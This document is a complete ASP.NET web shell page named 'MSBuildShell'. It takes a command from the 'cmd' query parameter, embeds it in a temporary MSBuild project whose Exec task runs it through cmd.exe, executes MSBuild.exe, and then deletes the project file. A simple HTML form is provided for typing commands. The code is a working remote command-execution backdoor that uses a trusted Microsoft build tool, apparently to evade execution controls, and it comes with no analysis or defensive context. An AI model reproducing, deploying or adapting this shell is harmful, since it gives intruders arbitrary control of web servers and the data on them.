<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            string proj = @"<?xml version=""1.0"" encoding=""utf-8""?>
<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
  <Target Name=""Execute"">
    <Exec Command=""cmd.exe /c {0}"" />
  </Target>
</Project>";
            proj = string.Format(proj, cmd);
            string projPath = Path.GetTempFileName() + ".proj";
            File.WriteAllText(projPath, proj);
            Process.Start("MSBuild.exe", projPath).WaitForExit();
            File.Delete(projPath);
            Response.Write("MSBuild task executed.");
        }
    }
</script>
<html><body><h2>MSBuildShell</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
